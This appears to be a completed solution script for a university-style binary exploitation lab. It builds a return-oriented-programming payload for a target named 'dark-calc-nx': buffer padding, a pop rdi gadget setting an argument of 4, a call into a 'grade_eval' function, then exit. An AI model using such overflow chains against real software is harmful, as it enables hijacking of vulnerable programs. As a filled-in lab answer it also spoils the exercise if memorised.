#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
payload = (
    b'A' * 0x18
    + b'\x34\x1a\x40\x00\x00\x00\x00\x00'   # 0x401a34  对齐用 ret
    + b'\x33\x1a\x40\x00\x00\x00\x00\x00'   # 0x401a33  pop rdi; ret
    + b'\x04\x00\x00\x00\x00\x00\x00\x00'   # 立即数 4（放在栈上的数据）
    + b'\x78\x19\x40\x00\x00\x00\x00\x00'   # 0x401978  grade_eval 入口
    + b'\x34\x1a\x40\x00\x00\x00\x00\x00'   # 0x401a34  对齐 ret（进 exit 前再对齐）
    + b'\x33\x1a\x40\x00\x00\x00\x00\x00'   # 0x401a33  pop rdi; ret
    + b'\x00\x00\x00\x00\x00\x00\x00\x00'   # 0         exit 参数
    + b'\xe0\x16\x40\x00\x00\x00\x00\x00'   # 0x4016e0  exit@plt
)
sys.stdout.buffer.write(payload)
